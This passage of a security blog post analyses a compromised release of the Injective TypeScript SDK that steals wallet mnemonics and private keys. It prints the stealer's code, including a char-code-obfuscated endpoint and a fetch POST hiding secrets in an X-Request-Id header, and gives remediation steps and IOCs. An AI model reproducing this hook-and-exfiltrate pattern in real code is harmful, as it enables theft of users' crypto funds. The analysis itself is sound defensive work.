\u003Ccode\u003EPrivateKey.fromHex()\u003C\u002Fcode\u003E. These functions are used when an application loads a wallet from a mnemonic phrase or from a raw private key.\u003C\u002Fp\u003E\n\u003Cp\u003EThe malicious addition is the call to \u003Ccode\u003EtrackKeyDerivation()\u003C\u002Fcode\u003E, which receives the mnemonic or private key before the SDK continues with normal key creation.\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Estatic fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {\n  trackKeyDerivation(\"fm\", words);\n  return new PrivateKey(new Wallet(HDNodeWallet.fromPhrase(words, void 0, path).privateKey));\n}\n\nstatic fromHex(privateKey) {\n  trackKeyDerivation(\"fh\", typeof privateKey === \"string\" ? privateKey : \"bytes\");\n  const isString = typeof privateKey === \"string\";\n  const privateKeyHex = isString &#x26;&#x26; privateKey.startsWith(\"0x\") ? privateKey.slice(2) : privateKey;\n  return new PrivateKey(new Wallet(uint8ArrayToHex(isString ? hexToUint8Array(privateKeyHex.toString()) : privateKey)));\n}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003EPrivateKey.generate()\u003C\u002Fcode\u003E is affected as well, even though it is not patched directly. It creates a mnemonic and immediately calls \u003Ccode\u003EPrivateKey.fromMnemonic(mnemonic)\u003C\u002Fcode\u003E, so a freshly generated wallet can be queued for exfiltration before the caller receives the returned key object.\u003C\u002Fp\u003E\n\u003Cp\u003EOne small but useful exception: the deprecated \u003Ccode\u003EPrivateKey.fromPrivateKey()\u003C\u002Fcode\u003E method constructs an \u003Ccode\u003Eethers.Wallet\u003C\u002Fcode\u003E directly and does not call \u003Ccode\u003EtrackKeyDerivation()\u003C\u002Fcode\u003E. The attacker did not patch every constructor. They patched the modern paths most developers are likely to use.\u003C\u002Fp\u003E\n\u003Ch2 id=\"sdk-calls-that-import-the-infected-privatekey\"\u003E\u003Ca href=\"#sdk-calls-that-import-the-infected-privatekey\" aria-hidden=\"true\" tabindex=\"-1\"\u003ESDK Calls That Import The Infected PrivateKey\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe payload is only in the \u003Ccode\u003EPrivateKey\u003C\u002Fcode\u003E class inside the infected \u003Ccode\u003Eaccounts-jQ1GSgaW.js\u003C\u002Fcode\u003E bundle. We found other built SDK files that import this same \u003Ccode\u003EPrivateKey\u003C\u002Fcode\u003E class and then call its infected \u003Ccode\u003EfromHex()\u003C\u002Fcode\u003E method.\u003C\u002Fp\u003E\n\u003Cp\u003EThe transaction broadcaster imports \u003Ccode\u003EPrivateKey\u003C\u002Fcode\u003E from the infected accounts bundle:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Eimport { S as createSignDoc, T as createSigners, b as createFee, n as PrivateKey, t as BaseAccount, v as createAuthInfo, y as createBody } from \".\u002Faccounts-jQ1GSgaW.js\";\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003ELater, \u003Ccode\u003EMsgBroadcasterWithPk\u003C\u002Fcode\u003E calls \u003Ccode\u003EPrivateKey.fromHex()\u003C\u002Fcode\u003E when \u003Ccode\u003Eoptions.privateKey\u003C\u002Fcode\u003E is not already a \u003Ccode\u003EPrivateKey\u003C\u002Fcode\u003E object:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Ethis.privateKey = options.privateKey instanceof PrivateKey\n  ? options.privateKey\n  : PrivateKey.fromHex(options.privateKey);\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003ESo a Node application using \u003Ccode\u003EMsgBroadcasterWithPk\u003C\u002Fcode\u003E with a raw private key can reach the infected method while creating the broadcaster.\u003C\u002Fp\u003E\n\u003Cp\u003EThe CosmJS-compatible wallet wrapper file also imports \u003Ccode\u003EPrivateKey\u003C\u002Fcode\u003E from the same infected bundle:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Eimport { F as PublicKey, k as getPublicKey, n as PrivateKey } from \".\u002Faccounts-jQ1GSgaW.js\";\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIn that file, both \u003Ccode\u003EEthSecp256k1Wallet\u003C\u002Fcode\u003E and \u003Ccode\u003EDirectEthSecp256k1Wallet\u003C\u002Fcode\u003E convert a byte array private key to hex and call \u003Ccode\u003EPrivateKey.fromHex()\u003C\u002Fcode\u003E:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Estatic async fromKey(privKey, prefix = \"inj\") {\n  return new EthSecp256k1Wallet(\n    privKey,\n    PrivateKey.fromHex(uint8ArrayToHex(privKey)).toPublicKey().toPubKeyBytes(),\n    prefix\n  );\n}\n\nconstructor(privKey, pubKey, prefix) {\n  this.privateKey = PrivateKey.fromHex(uint8ArrayToHex(privKey));\n  this.publicKey = PublicKey.fromBytes(pubKey);\n  this.prefix = prefix;\n}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe same pattern appears again in \u003Ccode\u003EDirectEthSecp256k1Wallet\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EIn these wrapper calls, the byte array is converted to a hex string before reaching \u003Ccode\u003EfromHex()\u003C\u002Fcode\u003E, so the full private key is passed to the infected method.\u003C\u002Fp\u003E\n\u003Ch2 id=\"exfiltration-through-a-grpc-web-disguise\"\u003E\u003Ca href=\"#exfiltration-through-a-grpc-web-disguise\" aria-hidden=\"true\" tabindex=\"-1\"\u003EExfiltration Through A gRPC-Web Disguise\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe URL is hidden as character codes and rebuilt when the code runs:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Econst _e = [\n  116, 101, 115, 116, 110, 101, 116, 46, 97, 114, 99, 104, 105, 118, 97, 108,\n  46, 99, 104, 97, 105, 110, 46, 103, 114, 112, 99, 45, 119, 101, 98, 46,\n  105, 110, 106, 101, 99, 116, 105, 118, 101, 46, 110, 101, 116, 119, 111,\n  114, 107\n];\nconst _d = () =\u003E _e.map((x) =\u003E String.fromCharCode(x)).join(\"\");\nconst _ep = \"https:\u002F\u002F\" + _d() + \"\u002F\";\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe rebuilt endpoint is:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxps:\u002F\u002Ftestnet[.]archival[.]chain[.]grpc-web[.]injective[.]network\u002F\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe stealer waits two seconds, groups the stolen values together, encodes them with base64, and sends them in an HTTP header:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Efunction trackKeyDerivation(method, value) {\n  _q.push(`${method}:${value}:${Date.now()}`);\n  _flush();\n}\n\nfunction _flush() {\n  if (_t) return;\n  _t = setTimeout(() =\u003E {\n    _t = null;\n    if (!_q.length) return;\n    _send(_enc(_q.join(\"|\")));\n    _q = [];\n  }, 2e3);\n}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe request body is empty. The secret is carried in \u003Ccode\u003EX-Request-Id\u003C\u002Fcode\u003E, while the content type mimics the SDK's normal gRPC-Web traffic:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Efetch(_ep, {\n  method: \"POST\",\n  headers: {\n    \"Content-Type\": \"application\u002Fgrpc-web+proto\",\n    \"X-Request-Id\": d\n  },\n  ...typeof window !== \"undefined\" ? { keepalive: true } : {}\n}).catch(() =\u003E {});\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"the-header-choice\"\u003E\u003Ca href=\"#the-header-choice\" aria-hidden=\"true\" tabindex=\"-1\"\u003EThe Header Choice\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EPutting the secret in \u003Ccode\u003EX-Request-Id\u003C\u002Fcode\u003E makes it easier to miss than putting it in the request body. Request IDs are often saved by proxies, API gateways, CDNs, and application logs for troubleshooting. If an affected environment logged the malicious request, the base64-encoded mnemonic or private key may have been copied into internal logs as well.\u003C\u002Fp\u003E\n\u003Cp\u003EA decoded header follows this structure:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Efm:&#x3C;mnemonic words\u003E:&#x3C;timestamp\u003E|fh:&#x3C;hex private key\u003E:&#x3C;timestamp\u003E\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"remediation\"\u003E\u003Ca href=\"#remediation\" aria-hidden=\"true\" tabindex=\"-1\"\u003ERemediation\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EAny project that installed \u003Ccode\u003E@injectivelabs\u002Fsdk-ts@1.20.21\u003C\u002Fcode\u003E, or any \u003Ccode\u003E@injectivelabs\u002F*@1.20.21\u003C\u002Fcode\u003E package that depended on it, should treat wallet secrets handled by that runtime as compromised.\u003C\u002Fp\u003E\n\u003Cp\u003ERecommended actions:\u003C\u002Fp\u003E\n\u003Col\u003E\n\u003Cli\u003EUpgrade all affected \u003Ccode\u003E@injectivelabs\u003C\u002Fcode\u003E packages to \u003Ccode\u003E1.20.23\u003C\u002Fcode\u003E or later.\u003C\u002Fli\u003E\n\u003Cli\u003ECheck lockfiles and package-manager caches for \u003Ccode\u003E@injectivelabs\u002Fsdk-ts\u003C\u002Fcode\u003E version \u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E.\u003C\u002Fli\u003E\n\u003Cli\u003ERotate any mnemonic or private key passed to the affected SDK version.\u003C\u002Fli\u003E\n\u003Cli\u003EMove funds from wallets whose mnemonic or private key may have been loaded or generated by the compromised version.\u003C\u002Fli\u003E\n\u003Cli\u003ESearch egress and proxy logs for \u003Ccode\u003Etestnet.archival.chain.grpc-web.injective.network\u003C\u002Fcode\u003E.\u003C\u002Fli\u003E\n\u003Cli\u003ESearch logs for base64-looking \u003Ccode\u003EX-Request-Id\u003C\u002Fcode\u003E values on \u003Ccode\u003Eapplication\u002Fgrpc-web+proto\u003C\u002Fcode\u003E POST requests.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Cp\u003EJFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has an automatic compliance version selection (CVS) mechanism to ensure developer and CI\u002FCD seamless fallback to compliant, non-malicious versions.\u003C\u002Fp\u003E\n\u003Ch2 id=\"conclusions\"\u003E\u003Ca href=\"#conclusions\" aria-hidden=\"true\" tabindex=\"-1\"\u003EConclusions\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThis attack shows that supply-chain malware does not need to be noisy to be dangerous. There is no install-time execution here, no persistence mechanism, and no broad host reconnaissance. The attacker placed a small hook in wallet key-loading code and waited for applications to hand it wallet secrets.\u003C\u002Fp\u003E\n\u003Cp\u003EThe imported \u003Ccode\u003EPrivateKey\u003C\u002Fcode\u003E paths are worth paying attention to. Applications did not need to call \u003Ccode\u003EPrivateKey.fromMnemonic()\u003C\u002Fcode\u003E or \u003Ccode\u003EPrivateKey.fromHex()\u003C\u002Fcode\u003E explicitly to be exposed. Transaction broadcasting and CosmJS wallet wrapper flows also route through the compromised constructor, and byte-array private keys can be leaked once the SDK converts them to hex strings internally.\u003C\u002Fp\u003E\n\u003Ch2 id=\"iocs\"\u003E\u003Ca href=\"#iocs\" aria-hidden=\"true\" tabindex=\"-1\"\u003EIOCs\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Ch3 id=\"package-iocs\"\u003E\u003Ca href=\"#package-iocs\" aria-hidden=\"true\" tabindex=\"-1\"\u003EPackage IOCs\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"left\"\u003EPackage\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EAffected version\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EXray IDs\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fsdk-ts\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024734\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Futils\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024741\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fnetworks\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024740\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fts-types\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024736\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fexceptions\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024733\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-base\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024751\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-core\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024748\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-cosmos\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024735\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-private-key\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024745\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-evm\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024749\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-trezor\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024737\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-cosmostation\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024747\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-ledger\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024744\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-wallet-connect\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024746\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-magic\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024739\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-strategy\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024743\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-turnkey\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024742\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@injectivelabs\u002Fwallet-cosmos-strategy\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1024738\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Ch3 id=\"network-iocs\"\u003E\u003Ca href=\"#network-iocs\" aria-hidden=\"true\" tabindex=\"-1\"\u003ENetwork IOCs\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Etestnet[.]archival[.]chain[.]grpc-web[.]injective[.]network\nhxxps:\u002F\u002Ftestnet[.]archival[.]chain[.]grpc-web[.]injective[.]network\u002F\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 id=\"behavioral-indicators\"\u003E\u003Ca href=\"#behavioral-indicators\" aria-hidden=\"true\" tabindex=\"-1\"\u003EBehavioral Indicators\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003EPrivateKey.fromMnemonic() followed by POST to Injective-looking gRPC-Web endpoint\nPrivateKey.fromHex() followed by POST to Injective-looking gRPC-Web endpoint\nMsgBroadcasterWithPk constructed with raw privateKey followed by outbound POST\nEthSecp256k1Wallet.fromKey() or DirectEthSecp256k1Wallet.fromKey() followed by outbound POST\nEmpty-body POST with high-entropy X-Request-Id header and Content-Type application\u002Fgrpc-web+proto\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n","excerpt":"Attackers compromised the official Injective TypeScript SDK release line and shipped a runtime wallet-key stealer disguised as key-derivation telemetry.","minutes":"5","schema":"","canonical":""}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.dc22d57e.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.1e9339a1.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
